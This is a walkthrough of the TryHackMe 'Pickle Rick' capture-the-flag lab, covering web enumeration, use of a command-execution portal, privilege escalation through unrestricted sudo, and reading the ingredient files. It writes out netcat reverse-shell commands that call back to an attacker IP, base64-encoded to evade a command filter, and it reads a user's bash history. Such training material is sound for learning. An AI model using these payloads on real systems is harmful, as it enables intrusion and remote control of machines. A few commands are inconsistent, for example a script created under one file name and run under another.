# TryHackMeMe: Pickle Rick (Write-up)

Pickle Rick is a TryHackMe CTF requiring you to exploit a web-server in order to find 3 _ingredients_.

## [Task 1] Pickle Rick

### What is the first ingredient Rick needs?

#### Browsing to home page

Lets start out by browsing to the IP, we've already been told the box is a _web server_, it's probably safe to assume that there might a _web_ site.

Browsing to the site you find an amusing Rick and Morty-based homepage telling you that you need to login the computer to retrieve 3 ingredients.

On further inspection of the page source, you'll find comment near the closing `</body`> tag:

```
Note to self, remember username!
Username: R1ckRul3s
```

#### Running enumeration scripts

##### NMAP
Nothing particularly interesting here, for now. Just further affirmation that there is a web-server, _and_ there's an SSH port that's open. Which, we'll be exploiting later on I imagine.
```
kali@kali:~/Desktop/TryHackMe/picklerick$ nmap -sV -sC 10.10.3.141 -oA nmap.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 09:21 EDT                                                    
Nmap scan report for target.thm (10.10.3.141)                                                                      
Host is up (0.021s latency).                                                                                       
Not shown: 998 closed ports                                                                                        
PORT   STATE SERVICE VERSION                                                                                       
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)                                  
| ssh-hostkey:                                                                                                     
|   2048 35:9f:5b:ab:b1:49:3d:27:a1:b2:5e:e6:68:31:36:f0 (RSA)                                                     
|   256 46:c6:60:c2:f9:86:73:e9:b7:b9:d9:b3:0a:ed:9b:89 (ECDSA)                                                    
|_  256 a9:4c:47:2f:0f:fb:15:65:95:22:c2:85:f6:66:a9:2d (ED25519)                                                  
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                       
|_http-title: Rick is sup4r cool                                                                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                            
```

##### GOBUSTER
Hopefully `gobuster` can reveal more about the application.
```
kali@kali:~/Desktop/TryHackMe/picklerick$ gobuster dir --url http://target.thm --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target.thm
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/13 09:24:29 Starting gobuster
===============================================================
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/13 09:25:31 Finished
===============================================================
```

The above GoBuster run was pretty sparce, so I ran another, this time enumerating files with extensions `htm,php,txt...`.
```
kali@kali:~/Desktop/TryHackMe/picklerick$ gobuster dir --url http://target.thm --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads 100 --extensions htm,php,txt,rar,zip,db,cfg,js --expanded --followredirect
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target.thm
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     htm,php,txt,rar,zip,db,cfg,js
[+] Follow Redir:   true
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/09/13 09:28:52 Starting gobuster
===============================================================
http://target.thm/login.php (Status: 200)
http://target.thm/assets (Status: 200)
http://target.thm/portal.php (Status: 200)
http://target.thm/robots.txt (Status: 200)

```
In this case, we found 3 important points:
- `login.php`
- `portal.php`
- `robots.txt`

### Digging into enumerated information

#### Login.php

This a login page, with a post form that sends the following params
- `username`
- `password`
- `sub=Login`

#### Portal.php
This page redirects to `.login.php`, likley because we're not logged in. We may have to bruteforce the login form with `hydra`.

#### Robots.txt
A malformed robots file. It contains a singular text line: `Wubbalubbadubdub`.
Could this be the password for the login page?


### Attempting to login with enumerated data

We'll be testing the following credentials that we've pulled so far:
- Username: `R1ckRul3s`
- Password: `Wubbalubbadubdub` ?

And fortunately, it works!

### Exploiting Portal.php

Now that we're in the Portal, we dig around.

#### Command execution form

The first thing we see on `portal.php` is the "command execution" input box. Lets test this, to see _what_ commands it runs. Preferrably it'll be some server side command execution; bash, or PHP.

Lets try running `ls -lah` and see if we can pull a directory listing.

And we can confirm the form _does_ execute bash script, and get the output: 

```
total 40K
drwxr-xr-x 3 root   root   4.0K Feb 10  2019 .
drwxr-xr-x 3 root   root   4.0K Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4.0K Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1.1K Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1.1K Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1.5K Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2.0K Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

After further attempted exploitation, I tried to run:
```
cat Sup3rS3cretPickl3Ingred.txt; echo; cat clue.txt; echo; whoami; echo; ps -aux; groups
```

Which returns _Command disabled to make it hard for future PICKLEEEE RICCCKKKK._ (¬.¬) ....

Fortunately the command input is only _temporarily_ disabled. And after a little fiddling around find that it's the `cat` command that's disabled. Though, interestingly the error message's source does contain some type of hashed data?

```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

The `whoami` command let me know that we're running as `www-data`.

The `ls /home` command shows there are two users with directories there: `rick`, `ubuntu`.

#### Trying to get a reverse netcat shell

I'd tried to figure out what the hell the above hash was, but to no avail, so lets see if we can get a reverse shell on the machine and get a more interactive interface to toy around with.

We'll need to listen for connections on our attacker machine.

```
# On the attacker machine
nc -lvp 4444
```

```
# On the victim machine, run netcat, and on connect, create a shell
nc 10.11.8.219 4444 -e /bin/sh
```

The connection failed, which could be down to the _version_ of netcat. So I ran `man netcat` via the portal input. Which returned a hint on how to bypass this:

```
There is no -c or -e option in this netcat, but you still can execute a
     command after connection being established by redirecting file descrip-
     tors. Be cautious here because opening a port and let anyone connected
     execute arbitrary command on your site is DANGEROUS. If you really need
     to do this, here is an example:

     On 'server' side:

           $ rm -f /tmp/f; mkfifo /tmp/f
           $ cat /tmp/f | /bin/sh -i 2>&1 | nc 10.11.8.219 4444 > /tmp/f
```

We can't use the `cat` command for a return; but, it _may_ still execute on the victim box, so lets test it at least.

```
# Run first, to create the mkfifo
rm -f /tmp/f; mkfifo /tmp/f;
# Run second, for reverse shell
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.11.8.219 4444 > /tmp/f;
```

Unfortunately we failed once again. I'm wondering at this point whether to:

a. Create shell script `shell.sh` and echo the _...Run second..._ part from above into it, then run that.
b. Create a PHP based shell, upload it to `/var/www/html` and just execute it.

I'll go with option _A_ first, then test _B_.

#### Shell attempt #1 (shell script)

To save time, I can determine if it's actally the _word_ `cat` that's causing the remote execution to fail. 

`echo 'cat';` if this fails, then we can skip to option B.

And fortunately-kinda, it fails. So looks like we should try another route. 

#### Shell attempt #2 (php script)

First we need to determine if we can `wget` files. If we can, we'll set up a `python3 -m http.server` on our attacker machine, create a PHP shell, upload it to `/var/www/html/...` then execute it by browsing to the file.

But, unfortunately, `wget` doesn't seem to return any response.

#### Shell attempt #3 (shell script hacky)

We can't run the `cat` command, but, we might be able to echo `ca`, and _then_ `t blah blah blah` into a script file that we execute. That way, we avoid inputting and explicit `cat` into our command.

We don't have _write_ access in `/var/www/html`.

On running `sudo -l`, our current user seems to have some funky permissions too. I'm unsure as to how to exploit this for the time being, but lets dive deeper and find our where we can write a shell to.

```
Matching Defaults entries for www-data on ip-10-10-3-141.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-3-141.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

It really feels like we _should_ have write access in `/var/www/html`, but lets try somewhere else. The classic `/tmp` directory is usually spankable.

```
touch /tmp/x.sh; ls -lah /tmp;
x.sh
```

*Success*, we can create a shell script here, now lets try our hacky `cat` concatenation.

```
# first we'll print 'ca' to the file, then the rest
printf 'ca' > /tmp/x.sh;
ls -lah /tmp/x.sh | grep x.sh; # we can see that bytes are added to the file! 
# and the rest...
printf 't /tmp/f | /bin/sh -i 2>&1 | nc -l 10.11.8.219 4444 > /tmp/f;' >> /tmp/x.sh;
ls -lah /tmp/x.sh | grep x.sh; # fingers crossed this'll run! 
# then try run the script with sudo
sudo sh /tmp/x.sh;
# if that fails try normal shell exec
sh /tmp/x.sh;
```

This unfortunately failed; but lets test if the shell script actually runs? It may be an error on our behalf.

```
touch /tmp/y.sh;
printf 'touch /tmp/works.txt; whoami | printf > /tmp/works.txt;' > /tmp/y.sh;
sudo sh /tmp/y.sh;
ls -lah /tmp/;
```

The script _is_ running as `root`, so we're _really_ close. See the `works.txt` file.

```
total 40K
drwxrwxrwt  8 root     root     4.0K Sep 13 14:33 .
drwxr-xr-x 23 root     root     4.0K Sep 13 12:50 ..
drwxrwxrwt  2 root     root     4.0K Sep 13 12:50 .ICE-unix
drwxrwxrwt  2 root     root     4.0K Sep 13 12:50 .Test-unix
drwxrwxrwt  2 root     root     4.0K Sep 13 12:50 .X11-unix
drwxrwxrwt  2 root     root     4.0K Sep 13 12:50 .XIM-unix
drwxrwxrwt  2 root     root     4.0K Sep 13 12:50 .font-unix
prw-r--r--  1 www-data www-data    0 Sep 13 14:04 f
drwx------  3 root     root     4.0K Sep 13 12:50 systemd-private-a938bdfc8fce449a9ca1d228a57f00d8-systemd-timesyncd.service-oSRCc2
-rw-r--r--  1 root     root        0 Sep 13 14:33 works.txt
-rw-r--r--  1 www-data www-data   63 Sep 13 14:30 x.sh
-rw-r--r--  1 www-data www-data   55 Sep 13 14:33 y.sh

```

It seems like it's the `printf` that didn't work, as there're no bytes in the file. Lets try `echo` instead.

```
touch /tmp/y.sh;
echo 'touch /tmp/works2.txt; whoami | echo > /tmp/works2.txt;' > /tmp/y.sh;
sudo sh /tmp/y.sh;
ls -lah /tmp/;
```

Hmm. As we DO have root. Let's see if we can steal some SSH files from either `rick` or `ubuntu`.

#### Stealing SSH files instead..

We know we can perform route actions, we just can't use `cat` or `head` .etc ... Little bit annoying, but, we do have more options. Lets see if there are some SSH keys we can acquire.

`sudo ls -lah /home/rick`

And heh, we've found the `second ingredient` file at least...

Though, the aren't any SSH files for rick.

`ls -lah /ubuntu/.ssh` has also been _wiped_. Annoyingly.

#### Lets get dirty, and create an encoded script

I'm going to encode the previous script with base64, then on the victim machine, decode the text into our shell script...

```
# on attacker machine

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4444 >/tmp/f' | base64;
```

We get the following output... which isn't quite right. 
```
# base64 script for victim...
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAu
MTEuOC4yMTkgNDQ0NCA+L3RtcC9mCg==
```

Lets chunk it down so we don't have a funky link break...

`echo 'rm /tmp/f;mkfifo /tmp/f;' | base64;`
`echo 'cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4444 >/tmp/f;' | base64;`

```
kali@kali:~/Desktop/TryHackMe/picklerick$ echo 'rm /tmp/f;mkfifo /tmp/f;' | base64;
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Cg==

kali@kali:~/Desktop/TryHackMe/picklerick$ echo 'cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4444 >/tmp/f;' | base64;
Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTEuOC4yMTkgNDQ0NCA+L3RtcC9mOwo=
```

And run this on victim machine
```
touch /tmp/a.sh;

echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Cg==' | base64 -d > /tmp/a.sh;
echo 'Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTEuOC4yMTkgNDQ0NCA+L3RtcC9mOwo=' | base64 -d >> /tmp/a.sh;

sudo sh /tmp/dog.sh;
```

We then we get *root* on our netcat!

```
kali@kali:~/Desktop/TryHackMe/picklerick$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.11.8.219] from target.thm [10.10.70.157] 42390
/bin/sh: 0: can't access tty; job control turned off                                                                                                        
# whoami                                                                                                           
root                                                                                                               
```

Now to explore and, finally, `cat` the files we were looking for.

#### Exploiting root shell

We can now read the first ingredient that Risk needs

```
# cat Sup3rS3cretPickl3Ingred.txt
```

### Whats the second ingredient Rick needs?

We stumbled on this earlier, it's tucked away in the `/home/rick` directory.

```
# cd /home/rick
# ls
second ingredients
# cat 'second ingredients'
```

### Whats the final ingredient Rick needs?

There's nothing in the `/home/rick` directory, so lets explore further.

The '/home/ubuntu' directory _seems_ empty at first, but on running `ls -lah`, we find there's a `.bash_history` file, which, contains a reference to the last ingredient.

```
cat /home/ubuntu/.bash_history
```


That was a good box.
